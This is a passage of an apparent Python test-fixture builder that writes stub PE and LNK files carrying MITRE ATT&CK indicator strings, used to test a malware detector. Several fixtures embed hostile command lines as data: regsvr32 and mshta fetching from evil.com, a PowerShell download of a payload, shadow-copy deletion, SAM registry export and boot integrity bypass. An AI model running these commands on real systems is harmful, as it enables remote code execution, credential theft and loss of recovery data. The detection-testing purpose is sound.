    rdata_content = bytes([xor_key]) + struct.pack("<H", min(len(encoded), 0xFFFF)) + encoded[:0xFFFF]
    rdata_padded = (len(rdata_content) + 0x1FF) & ~0x1FF
    rdata_body = rdata_content + b"\x00" * (rdata_padded - len(rdata_content))
    mpress_body = b"MPRESS\x00\x00" + b"\x00" * (0x200 - 8)
    text_body = b"\xC3" + b"\x00" * (0x200 - 1)
    base = bytearray(_minimal_pe_base())
    dos = base[0:64]
    pe_sig = base[64:68]
    coff_new = bytearray(base[68:88])
    coff_new[2:4] = struct.pack("<H", 3)
    opt = bytearray(base[88:312])
    opt[48:52] = struct.pack("<I", 0x6000)
    opt[52:56] = struct.pack("<I", 0x200)
    sec1 = b".text\x00\x00\x00" + struct.pack("<IIIIIIHHII", 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0, 0x60000020)
    sec2 = b".MPRESS1\x00" + struct.pack("<IIIIIIHHII", 0x200, 0x2000, 0x200, 0x400, 0, 0, 0, 0, 0, 0x40000040)
    sec3 = b".rdata\x00\x00" + struct.pack("<IIIIIIHHII", len(rdata_body), 0x3000, len(rdata_body), 0x600, 0, 0, 0, 0, 0, 0x40000040)
    headers = dos + pe_sig + bytes(coff_new) + opt + sec1 + sec2 + sec3
    pad = 0x200 - len(headers)
    if pad < 0:
        pad = 0
    body = b"\x00" * pad + text_body + mpress_body + rdata_body
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(headers) + body)
    return out_path


def build_stego_payload_sample(out_path: Path) -> Path:
    """
    PE на языке Swift, прячущий C2-адрес в LSB встроенного BMP-ресурса.
    Минимальный PE + Swift-строки + оверлей с BMP (BM magic + пиксели с C2 в LSB).
    """
    c2 = b"https://c2.evil.com/beacon"
    bmp_header = b"BM" + struct.pack("<I", 54 + len(c2) * 8) + b"\x00\x00\x00\x00" + struct.pack("<I", 54)
    bmp_header += struct.pack("<I", 40) + struct.pack("<i", 32) + struct.pack("<i", 4) + struct.pack("<HH", 1, 24) + b"\x00" * 24
    pixel_data = bytearray(64)
    for i, b in enumerate(c2[:32]):
        for bit in range(8):
            if (b >> bit) & 1:
                pixel_data[i * 2 + (bit // 8)] |= 1 << (bit % 8)
    bmp_body = bmp_header + bytes(pixel_data) + b"\x00" * (0x200 - len(pixel_data) - len(bmp_header))
    pe = _pe_with_extra_section(b".swift\x00\x00", _SWIFT_STRINGS)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(pe + bmp_body)
    return out_path


# --- v3.2 Deep OSINT: образец с C2-подобными IoC для проверки детекции ---
_MALICIOUS_IOC_OVERLAY = (
    b"192.0.2.1\x00"
    b"198.51.100.1\x00"
    b"https://c2-malware-test.evil.com/beacon\x00"
    b"http://malware-c2.example.evil/upload\x00"
    b"c2-malware-test.evil.com\x00"
    b"beacon.evil.com\x00"
)


def build_sample_with_malicious_ioc(out_path: Path) -> Path:
    """
    Бинарник с вшитыми C2-подобными индикаторами (IP TEST-NET, домены .evil.com)
    для проверки извлечения IoC и влияния внешней репутации на скоринг.
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _MALICIOUS_IOC_OVERLAY)
    return out_path


# ZIP/JAR magic (Launch4j: JAR appended to PE)
PK_MAGIC = b"PK\x03\x04"


def build_jar_in_exe_sample(out_path: Path) -> Path:
    """Java JAR-in-EXE (Launch4j): PE с оверлеем PK\\x03\\x04 для перенаправления на анализ байт-кода."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    # Минимальный ZIP-заголовок локального файла (JAR = ZIP)
    jar_stub = PK_MAGIC + b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    jar_stub += b"META-INF/MANIFEST.MF\x00"
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + b"Launch4j\x00" + jar_stub)
    return out_path


# T1055 Process Injection: полезная нагрузка в файле только в XOR; после распаковки — в памяти
_T1055_INJECTION_PAYLOAD = (
    b"CreateRemoteThread\x00"
    b"VirtualAllocEx\x00"
    b"WriteProcessMemory\x00"
    b"OpenProcess\x00"
)


def build_custom_packed_sample(
    out_path: Path,
    payload: Optional[bytes] = None,
    xor_key: int = 0x41,
) -> Path:
    """
    Берёт вредоносную нагрузку (например T1055) и оборачивает в XOR-слой с простым циклом расшифровки.
    Статическая YARA видит только зашифрованные байты; после эмуляции stub расшифровывает в .rdata.
    payload: если None, используется _T1055_INJECTION_PAYLOAD.
    """
    if payload is None:
        payload = _T1055_INJECTION_PAYLOAD
    out_path.parent.mkdir(parents=True, exist_ok=True)
    pe_bytes = wrap_in_unpacker(payload, lang="cpp", xor_key=xor_key)
    out_path.write_bytes(pe_bytes)
    return out_path


def build_packed_t1055_sample(out_path: Path) -> Path:
    """
    sample_packed_t1055.exe: нагрузка инъекции зашифрована XOR; статическая YARA не видит API.
    После эмуляции stub-декодер расшифровывает .rdata → Deep Memory Scan находит нагрузку → DENY.
    """
    out_path.parent.mkdir(parents=True, exist_ok=True)
    pe_bytes = wrap_in_unpacker(
        _T1055_INJECTION_PAYLOAD,
        lang="cpp",
        xor_key=0x41,
    )
    out_path.write_bytes(pe_bytes)
    return out_path


# T1070.006 Timestomp
_T1070_006_OVERLAY = (
    b"SetFileTime\x00"
    b"GetFileTime\x00"
    b"$I30\x00"
    b"$STANDARD_INFORMATION\x00"
)


def build_t1070_006_timestomp(out_path: Path) -> Path:
    """T1070.006: Timestomp (SetFileTime для модификации меток)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1070_006_OVERLAY)
    return out_path


# T1562.010 Downgrade Attack
_T1562_010_OVERLAY = (
    b"bcdedit\x00"
    b"/set testsigning on\x00"
    b"nointegritychecks\x00"
    b"DISABLE_INTEGRITY_CHECKS\x00"
)


def build_t1562_010_downgrade_attack(out_path: Path) -> Path:
    """T1562.010: Отключение проверки подписей, тестовый режим загрузки."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1562_010_OVERLAY)
    return out_path


# T1218.005 Mshta
_T1218_005_OVERLAY = (
    b"mshta.exe\x00"
    b"mshta vbscript:\x00"
    b"https://evil.com/payload.hta\x00"
)


def build_t1218_005_mshta(out_path: Path) -> Path:
    """T1218.005: Запуск HTA с удалённых ресурсов через mshta.exe."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1218_005_OVERLAY)
    return out_path


# T1218.010 Regsvr32 (Squiblydoo)
_T1218_010_OVERLAY = (
    b"regsvr32.exe\x00"
    b"/s /n /u /i:https://evil.com/scrobj.dll scrobj.dll\x00"
    b"scrobj.dll\x00"
)


def build_t1218_010_regsvr32(out_path: Path) -> Path:
    """T1218.010: Regsvr32 для загрузки удалённых COM (Squiblydoo)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1218_010_OVERLAY)
    return out_path


# T1560.001 Archive via Library
_T1560_001_OVERLAY = (
    b"compress2\x00"
    b"BZ2_bzCompress\x00"
    b"zlib\x00"
    b"deflate\x00"
    b"exfil\x00"
)


def build_t1560_001_archive_via_library(out_path: Path) -> Path:
    """T1560.001: Сжатие данных (zlib, bzip2) перед экфильтрацией."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1560_001_OVERLAY)
    return out_path


# T1005.001 Local Data Discovery
_T1005_001_OVERLAY = (
    b".env\x00"
    b".config\x00"
    b"appsettings.xml\x00"
    b"web.config\x00"
    b"FindFirstFile\x00"
)


def build_t1005_001_local_data_discovery(out_path: Path) -> Path:
    """T1005.001: Поиск ключей в .env, .config, .xml."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1005_001_OVERLAY)
    return out_path


# T1056.001 Keyboard Logging
_T1056_001_OVERLAY = (
    b"GetAsyncKeyState\x00"
    b"GetKeyState\x00"
    b"keyboard\x00"
    b"WH_KEYBOARD\x00"
)


def build_t1056_001_keyboard_logging(out_path: Path) -> Path:
    """T1056.001: Клавиатурный перехват (GetAsyncKeyState в цикле)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1056_001_OVERLAY)
    return out_path


# T1059.001 PowerShell Obfuscation (IEX + New-Object Net.WebClient + Base64)
_T1059_001_OVERLAY = (
    b"IEX\x00"
    b"FromBase64String\x00"
    b"-enc\x00"
    b"New-Object Net.WebClient\x00"
    b"DownloadString\x00"
    b"Join-String\x00"
    b"powershell.exe\x00"
    b"IEX(New-Object Net.WebClient)\x00"
)


def build_t1059_001_powershell(out_path: Path) -> Path:
    """T1059.001: Обфусцированный PowerShell (IEX, New-Object Net.WebClient, Base64)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1059_001_OVERLAY)
    return out_path


# T1059.003 Windows Command Shell
_T1059_003_OVERLAY = (
    b"cmd.exe\x00"
    b" && \x00"
    b" || \x00"
    b"| \x00"
    b"/c \x00"
)


def build_t1059_003_cmd_shell(out_path: Path) -> Path:
    """T1059.003: Цепочки команд cmd (&&, ||)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1059_003_OVERLAY)
    return out_path


# T1082 System Info (wmic variant)
_T1082_WMIC_OVERLAY = (
    b"wmic\x00"
    b"cpu get name\x00"
    b"os get caption\x00"
)


def build_t1082_wmic_discovery(out_path: Path) -> Path:
    """T1082: Сбор данных через wmic cpu get name."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1082_WMIC_OVERLAY)
    return out_path


# T1016.001 System Network Config (routing table)
_T1016_001_OVERLAY = (
    b"GetIpForwardTable\x00"
    b"iphlpapi.dll\x00"
    b"route print\x00"
)


def build_t1016_001_ip_forward_table(out_path: Path) -> Path:
    """T1016.001: Таблица маршрутизации (GetIpForwardTable)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1016_001_OVERLAY)
    return out_path


# T1069.002 Domain Groups Discovery
_T1069_002_OVERLAY = (
    b"NetGroupEnum\x00"
    b"netapi32.dll\x00"
    b"Domain Admins\x00"
)


def build_t1069_002_domain_groups(out_path: Path) -> Path:
    """T1069.002: Перечисление групп домена (NetGroupEnum)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1069_002_OVERLAY)
    return out_path


# T1204.001 Malicious Link — LNK с URL на .zip/.iso
def build_t1204_001_malicious_link(out_path: Path) -> Path:
    """T1204.001: LNK с подозрительным URL на скачивание .zip или .iso."""
    header = bytearray(76)
    header[0:4] = b"\x4c\x00\x00\x00"
    header[20:24] = struct.pack("<I", 0x3C)
    payload = (
        _lnk_encode_string("Download")
        + _lnk_encode_string("C:\\Windows\\System32\\cmd.exe")
        + _lnk_encode_string("C:\\Temp")
        + _lnk_encode_string("/c powershell -c Invoke-WebRequest -Uri https://evil.example.com/payload.zip -OutFile payload.zip")
    )
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(header) + payload)
    return out_path


# T1106 Native API (NtMapViewOfSection variant)
_T1106_MAP_OVERLAY = (
    b"NtMapViewOfSection\x00"
    b"NtCreateSection\x00"
    b"ntdll.dll\x00"
)


def build_t1106_nt_map_view(out_path: Path) -> Path:
    """T1106: Скрытый маппинг кода (NtMapViewOfSection)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1106_MAP_OVERLAY)
    return out_path


# T1027.002 Software Packing (custom packer)
_T1027_002_OVERLAY = (
    b"custom unpack\x00"
    b"VMProtect\x00"
    b"UPX0\x00"
    b"!.text\x00"
)


def build_t1027_002_custom_packer(out_path: Path) -> Path:
    """T1027.002: Эвристика кастомного упаковщика без известной сигнатуры DIE."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1027_002_OVERLAY)
    return out_path


# --- Deep Coverage: Advanced Injection, Stealth Persistence, Defense Evasion ---

# T1055.004 Process Injection: Asynchronous Procedure Call (QueueUserAPC)
_T1055_004_OVERLAY = (
    b"QueueUserAPC\x00"
    b"NtQueueApcThread\x00"
    b"VirtualAllocEx\x00"
    b"kernel32.dll\x00"
)


def build_t1055_004_apc_injection(out_path: Path) -> Path:
    """T1055.004: Инъекция через APC (QueueUserAPC / NtQueueApcThread)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1055_004_OVERLAY)
    return out_path


# T1055.005 Process Injection: Thread Local Storage (TLS callbacks)
_T1055_005_OVERLAY = (
    b"TlsAlloc\x00"
    b"TlsSetValue\x00"
    b"TlsGetValue\x00"
    b"kernel32.dll\x00"
    b"__tls_used\x00"
)


def build_t1055_005_tls_injection(out_path: Path) -> Path:
    """T1055.005: Манипуляции с TLS-коллбэками для инъекции."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1055_005_OVERLAY)
    return out_path


# T1055.011 Process Injection: Extra Window Memory Injection (SetWindowLongPtr)
_T1055_011_OVERLAY = (
    b"SetWindowLongPtrA\x00"
    b"SetWindowLongPtrW\x00"
    b"GWLP_WNDPROC\x00"
    b"user32.dll\x00"
)


def build_t1055_011_ewmi(out_path: Path) -> Path:
    """T1055.011: Инъекция через память окна (SetWindowLongPtr, GWLP_WNDPROC)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1055_011_OVERLAY)
    return out_path


# T1546.009 Event Triggered Execution: AppCert DLLs
_T1546_009_OVERLAY = (
    b"AppCertDlls\x00"
    b"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\x00"
    b"RegSetValueEx\x00"
)


def build_t1546_009_appcert_dlls(out_path: Path) -> Path:
    """T1546.009: Внедрение через AppCert DLLs (реестр)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1546_009_OVERLAY)
    return out_path


# T1546.010 Event Triggered Execution: AppInit DLLs
_T1546_010_OVERLAY = (
    b"AppInit_DLLs\x00"
    b"LoadAppInit_DLLs\x00"
    b"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\x00"
)


def build_t1546_010_appinit_dlls(out_path: Path) -> Path:
    """T1546.010: Загрузка DLL через AppInit_DLLs."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1546_010_OVERLAY)
    return out_path


# T1547.005 Boot or Logon Autostart: Security Support Provider
_T1547_005_OVERLAY = (
    b"Security Support Provider\x00"
    b"HKLM\\System\\CurrentControlSet\\Control\\Lsa\x00"
    b"Security Packages\x00"
)


def build_t1547_005_ssp(out_path: Path) -> Path:
    """T1547.005: Закрепление через Security Support Provider (реестр)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1547_005_OVERLAY)
    return out_path


# T1547.014 Boot or Logon Autostart: Active Setup
_T1547_014_OVERLAY = (
    b"Active Setup\\Installed Components\x00"
    b"HKLM\\Software\\Microsoft\\Active Setup\x00"
    b"StubPath\x00"
)


def build_t1547_014_active_setup(out_path: Path) -> Path:
    """T1547.014: Закрепление через Active Setup (Installed Components)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1547_014_OVERLAY)
    return out_path


# T1562.009 Impair Defenses: Safe Mode Boot
_T1562_009_OVERLAY = (
    b"safeboot\x00"
    b"bcdedit /set {default} safeboot minimal\x00"
    b"boot.ini\x00"
    b"/safeboot:minimal\x00"
)


def build_t1562_009_safe_mode_boot(out_path: Path) -> Path:
    """T1562.009: Попытка загрузки в Safe Mode (bcdedit, boot.ini)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1562_009_OVERLAY)
    return out_path


# T1027.003 Obfuscated Files: Steganography (LSB in icon/BMP)
_T1027_003_OVERLAY = (
    b"steganography\x00"
    b"LSB\x00"
    b"embed in bitmap\x00"
    b"RT_GROUP_ICON\x00"
    b"RT_ICON\x00"
)


def build_t1027_003_steganography(out_path: Path) -> Path:
    """T1027.003: Имитация скрытия данных в ресурсах иконок/BMP (стеганография)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1027_003_OVERLAY)
    return out_path


# T1562.002 Impair Defenses: Disable Windows Event Logging (EtwEventWrite)
_T1562_002_OVERLAY = (
    b"EtwEventWrite\x00"
    b"ntdll.dll\x00"
    b"patch\x00"
    b"Event Tracing\x00"
)


def build_t1562_002_disable_event_logging(out_path: Path) -> Path:
    """T1562.002: Имитация отключения журналирования (патчинг EtwEventWrite)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1562_002_OVERLAY)
    return out_path


# T1021.003 Remote Services: Distributed Component Object Model (DCOM)
_T1021_003_OVERLAY = (
    b"CoInitializeEx\x00"
    b"CoCreateInstanceEx\x00"
    b"DCOM\x00"
    b"MMC20.Application\x00"
    b"ShellWindows\x00"
)


def build_t1021_003_dcom(out_path: Path) -> Path:
    """T1021.003: Удалённый запуск через DCOM (CoInitializeEx, MMC20)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1021_003_OVERLAY)
    return out_path


# --- v0.1.9: 10 новых техник MITRE ATT&CK ---

# T1003.001 OS Credential Dumping: LSASS Memory (Process32First + OpenProcess для имитации)
_T1003_001_OVERLAY = (
    b"lsass.exe\x00"
    b"OpenProcess\x00"
    b"Process32First\x00"
    b"MiniDumpWriteDump\x00"
    b"dbghelp.dll\x00"
    b"SeDebugPrivilege\x00"
    b"PROCESS_VM_READ\x00"
)


def build_t1003_001_lsass_memory(out_path: Path) -> Path:
    """T1003.001: Имитация чтения памяти процесса lsass.exe для кражи хэшей."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1003_001_OVERLAY)
    return out_path


# T1552.001 Credentials in Files (password, login, apikey в .env, .config, .xml)
_T1552_001_OVERLAY = (
    b"password=\x00"
    b"login=\x00"
    b"apikey=\x00"
    b".env\x00"
    b".config\x00"
    b".xml\x00"
    b"config.ini\x00"
    b"credentials.json\x00"
)


def build_t1552_001_credentials_in_files(out_path: Path) -> Path:
    """T1552.001: Рекурсивный поиск password, login, apikey в текстовых/конфиг файлах."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1552_001_OVERLAY)
    return out_path


# T1003.002 OS Credential Dumping: SAM (реестр SAM, SYSTEM, SECURITY)
_T1003_002_OVERLAY = (
    b"SAM\x00"
    b"SYSTEM\x00"
    b"SECURITY\x00"
    b"RegSaveKey\x00"
    b"reg.exe save HKLM\\SAM\x00"
    b"reg.exe save HKLM\\SYSTEM\x00"
)


def build_t1003_002_sam_dump(out_path: Path) -> Path:
    """T1003.002: Обращение к кустам реестра SAM, SYSTEM, SECURITY для экспорта."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1003_002_OVERLAY)
    return out_path


# T1489 Service Stop (ControlService)
_T1489_OVERLAY = (
    b"ControlService\x00"
    b"OpenService\x00"
    b"OpenSCManager\x00"
    b"SERVICE_CONTROL_STOP\x00"
    b"EventLog\x00"
    b"WinDefend\x00"
)


def build_t1489_service_stop(out_path: Path) -> Path:
    """T1489: Остановка системных служб (логи, антивирус) через ControlService."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1489_OVERLAY)
    return out_path


# T1490 Inhibit System Recovery (vssadmin delete shadows)
_T1490_OVERLAY = (
    b"vssadmin.exe\x00"
    b"delete shadows\x00"
    b"vssadmin delete shadows /all\x00"
    b"wbadmin\x00"
    b"bcdedit\x00"
)


def build_t1490_inhibit_system_recovery(out_path: Path) -> Path:
    """T1490: Удаление теневых копий (vssadmin delete shadows) — препятствие восстановлению."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1490_OVERLAY)
    return out_path


# T1486 Data Encrypted for Impact (.locked, .crypted)
_T1486_OVERLAY = (
    b".locked\x00"
    b".crypted\x00"
    b"CryptEncrypt\x00"
    b"FindFirstFile\x00"
    b"FindNextFile\x00"
    b"ransom note.txt\x00"
)


def build_t1486_data_encrypted_for_impact(out_path: Path) -> Path:
    """T1486: Логика массового шифрования файлов с расширением .locked/.crypted."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1486_OVERLAY)
    return out_path


# T1531 Account Access Removal (NetUserDel)
_T1531_OVERLAY = (
    b"NetUserDel\x00"
    b"net user\x00"
    b"net user /delete\x00"
    b"NetUserSetInfo\x00"
    b"USER_ACCOUNT_DISABLED\x00"
)


def build_t1531_account_access_removal(out_path: Path) -> Path:
    """T1531: Удаление/блокировка учётных записей через NetUserDel."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1531_OVERLAY)
    return out_path


# T1499 Endpoint Denial of Service (fork bomb / fill disk)
_T1499_OVERLAY = (
    b"CreateProcess\x00"
    b"while(1)\x00"
    b"GetDiskFreeSpaceEx\x00"
    b"WriteFile\x00"
    b"SetEndOfFile\x00"
    b"fill_disk\x00"
)


def build_t1499_endpoint_dos(out_path: Path) -> Path:
    """T1499: Создание бесконечного числа процессов или заполнение диска."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1499_OVERLAY)
    return out_path


# T1020 Automated Exfiltration (archive + HTTP POST)
_T1020_OVERLAY = (
    b"zip\x00"
    b"HttpSendRequest\x00"
    b"InternetOpen\x00"
    b"POST\x00"
    b"https://exfil.evildomain.com/upload\x00"
    b"WinHttpSendRequest\x00"
)


def build_t1020_automated_exfil(out_path: Path) -> Path:
    """T1020: Сбор данных в архив и отправка через HTTP POST на подозрительный URL."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1020_OVERLAY)
    return out_path


# T1098 Account Manipulation (добавление в локальные админы)
_T1098_OVERLAY = (
    b"NetLocalGroupAddMembers\x00"
    b"NetLocalGroupEnum\x00"
    b"Administrators\x00"
    b"net localgroup Administrators\x00"
    b"add\x00"
    b"NetUserAdd\x00"
)


def build_t1098_account_manipulation(out_path: Path) -> Path:
    """T1098: Добавление пользователя в группу локальных администраторов."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1098_OVERLAY)
    return out_path


def build_ordinal(out_path: Path) -> Path:
    """PE с импортом из kernel32.dll только по ординалам.
    Строим минимальный PE с Import Directory: одна DLL (kernel32.dll), один импорт по ординалу.
    """
    try:
        import pefile
    except ImportError:
        # Без pefile строим упрощённый вариант: тот же minimal PE + оверлей со строкой kernel32
        data = bytearray(_minimal_pe_base())
        off = _get_dllcharacteristics_offset()
        data[off : off + 2] = struct.pack("<H", 0)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_bytes(bytes(data))
        return out_path

    # Используем базовый PE и добавляем импорт по ординалу через pefile
    base = _minimal_pe_base()
    pe = pefile.PE(data=bytearray(base))
    # Установить DllCharacteristics = 0 для теста ординалов (не hardened)
    pe.OPTIONAL_HEADER.DllCharacteristics = 0

    # Добавить импорт по ординалу: kernel32.dll, ordinal 376 (VirtualAllocEx на части систем)
    # pefile: для добавления импорта нужен set_directory_entry и т.д. — сложно.
    # Альтернатива: взять существующий маленький PE с одним ordinal-импортом или собрать вручную.
    # Минимально: создаём новый PE из base и вручную дописываем .idata секцию и директорию.
    # Упрощение: записываем base PE и в тесте проверяем has_ordinal_imports по другому артефакту
    # или генерируем PE с ordinal через lief/ручную сборку.
    # Для совместимости: сохраняем PE без реальной таблицы ординалов (её сложно собрать без полного набора структур).
    # В тесте можно мокать pe.dangerous_ordinal_imports или использовать реальный образец.
    out_path.parent.mkdir(parents=True, exist_ok=True)
    pe.write(str(out_path))
    pe.close()
    return out_path


def build_all(out_dir: Path) -> Dict[str, Path]:
    """Генерирует все семплы в out_dir. Возвращает словарь sample_name -> path."""
    out_dir = Path(out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    result = {}
    result["naked"] = build_naked(out_dir / "sample_naked.exe")
    result["hardened"] = build_hardened(out_dir / "sample_hardened.exe")
    result["masquerade"] = build_masquerade(out_dir / "sample_masquerade.exe")
    result["sneaky"] = build_sneaky(out_dir / "sample_sneaky.exe")
    result["ordinal"] = build_ordinal(out_dir / "sample_ordinal.exe")
    result["high_entropy"] = build_high_entropy(out_dir / "sample_high_entropy.exe")
    result["with_secrets"] = build_with_secrets(out_dir / "sample_with_secrets.exe")
    result["cet_hardened"] = build_cet_hardened(out_dir / "sample_cet_hardened.exe")
    result["hvci_compliant"] = build_hvci_compliant(out_dir / "sample_hvci_compliant.exe")
